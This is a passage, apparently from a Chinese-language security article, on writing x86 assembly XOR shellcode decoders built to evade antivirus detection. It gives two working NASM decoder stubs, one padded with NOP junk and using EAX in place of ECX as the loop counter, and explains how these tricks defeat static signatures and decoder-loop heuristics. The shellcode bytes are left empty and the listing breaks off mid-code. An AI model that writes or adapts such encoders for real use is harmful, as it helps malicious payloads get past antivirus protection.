    17.XOR ECX,ECX ; Zero out the ECX register
    18.GetKey: 
    19.CALL SetKey ; Call the SetKey label
    20.Key: DB  ; Decipher key
    21.KeyEnd: EQU $-Key ; Set the size of the decipher key to KeyEnd label
    22.SetKey:
    23.POP EDI ; Pop the address of decipher key to EDI register
    24.XOR EDX,EDX ; Zero out the EDX register
    25.Decipher: 
    26.MOV AL,[ESI] ; Move 1 byte from shellcode to AL register
    27.MOV BL,[EDI] ; Move 1 byte from decipher key to BL register
    28.XOR AL,BL ; Make a logical XOR operation between AL ^ BL
    29.MOV [ESI],AL ; Move back the deciphered shellcode byte to same index
    30.INC ESI ; Increase the shellcode index
    31.INC EDI ; Increase the key index
    32.INC ECX ; Increase the shellcode index counter
    33.INC EDX ; Increase the key index counter
    34.CMP ECX, End ; Compare the shellcode index counter with shellcode size 
    35.JE Fin ; If index counter is equal to shellcode size, jump to Fin label
    36.CMP EDX,KeyEnd ; Compare the key index counter with key size 
    37.JE GetKey ; If key index counter is equal to key size, jump to GetKey label for reseting the key
    38.JMP Decipher ; Repeate all operations
    39.Fin: ; In here deciphering operation is finished
    40.RET ; Execute the shellcode
    41.GetShellcode:
    42.CALL Stub ; Jump to Stub label and push the address of shellcode to stack
    43.Shellcode: DB 
    44.
    45.End: EQU $-Shellcode ; Set the shellcode size to End label
因为代码非常好理解，我将不浪费时间逐行解释它了，使用JMP/CALL技巧能在运行时得到shellcode和密钥的地址，然后在shellcode和密钥的每个字节之间执行一个逻辑XOR操作，每次解密密钥到末尾，它将重置密钥为它的起始地址，在完成解码操作后，将跳转到shellcode，使用更长的XOR密钥能提高shellcode的随机性，但是也提高了代码块的熵，因此要避免使用太长的解码密钥，使用基础的逻辑操作（如XOR，NOT，ADD，SUB，ROR，ROL）能有几百种方式编码shellcode，在每种编码器中有无穷可能的shellcode输出，AV产品在解码序列之前检测到任何shellcode的特征的概率很低，因为这种AV产品也开发了启发式引擎，它能够检测解密和代码块中的解码循环。当编写shellcode编码器时，几乎没有用于绕过用于检测解码循环的静态方法的有效方式。
**不常见的寄存器的使用：**
在x86架构中，所有的寄存器有一个特定的目的，例如ECX表示扩展计数寄存器，且它通常用于循环计数。当我们编写一个基础的循环条件时，编译器可能使用ECX寄存器作为循环计数器变量，在一个代码块中找到连续增长的ECX寄存器强烈暗示了一个循环，这个问题的解决方案非常简单，不使用ECX作为循环计数器，这只是一个例子，但是它对于所有的其它类型的代码片段（如函数epilogue/prologue等）也非常有效。大量的代码识别机制依赖寄存器的使用，使用不常见的寄存器编写汇编代码将减小被检测率。
垃圾代码填充：
在代码块中可能有几百种方法识别解码器，且几乎每个AV产品使用不同的方式，但是最终他们都不得不将可能的解码器的代码块生成一个特征，在解码器代码中使用随机的NOP指令是绕过静态特征分析的一种非常好的方式，不一定要使用NOP指令，可以是任何维持原有功能的其他指令，目标是增加垃圾指令以便破环代码块的恶意的特征。另一个关于编写shellcode重要的事是大小，因此避免使用太大的垃圾混淆代码否则将增加整体大小。
实现这种方法的代码如下：
    1.; #==============================#
    2.; |ESI -> Pointer to shellcode |
    3.; |EDI -> Pointer to key |
    4.; |EAX -> Shellcode index counter|
    5.; |EDX -> Key index counter |
    6.; |CL -> Shellcode byte holder |
    7.; |BL -> Key byte holder |
    8.; #==============================#
    9.;
    10.
    11.[BITS 32]
    12.[ORG 0]
    13.
    14.JMP GetShellcode ; Jump to shellcode label
    15.Stub: 
    16.POP ESI ; Pop out the address of shellcode to ESI register 
    17.PUSH ESI ; Save the shellcode address to stack 
    18.XOR EAX,EAX ; Zero out the EAX register
    19.GetKey: 
    20.CALL SetKey ; Call the SetKey label
    21.Key: DB 0x78, 0x9b, 0xc5, 0xb9, 0x7f, 0x77, 0x39, 0x5c, 0x4f, 0xa6 ; Decipher key
    22.KeyEnd: EQU $-Key ; Set the size of the decipher key to KeyEnd label
    23.SetKey:
    24.POP EDI ; Pop the address of decipher key to EDI register
    25.NOP ; [GARBAGE]
    26.XOR EDX,EDX ; Zero out the EDX register
    27.NOP ; [GARBAGE]
    28.Decipher: 
    29.NOP ; [GARBAGE]
    30.MOV CL,[ESI] ; Move 1 byte from shellcode to CL register
    31.NOP ; [GARBAGE]
    32.NOP ; [GARBAGE]
    33.MOV BL,[EDI] ; Move 1 byte from decipher key to BL register
    34.NOP ; [GARBAGE]
    35.XOR CL,BL ; Make a logical XOR operation between CL ^ BL
    36.NOP ; [GARBAGE]
    37.NOP ; [GARBAGE]
    38.MOV [ESI],CL ; Move back the deciphered shellcode byte to same index
    39.NOP ; [GARBAGE]
    40.NOP ; [GARBAGE]
    41.INC ESI ; Increase the shellcode index
    42.INC EDI ; Increase the key index
    43.INC EAX ; Increase the shellcode index counter
    44.INC EDX ; Increase the key index counter
    45.CMP EAX, End ; Compare the shellcode index counter with shellcode size 
    46.JE Fin ; If index counter is equal to shellcode size, jump to Fin label
    47.CMP EDX,KeyEnd ; Compare the key index counter with key size 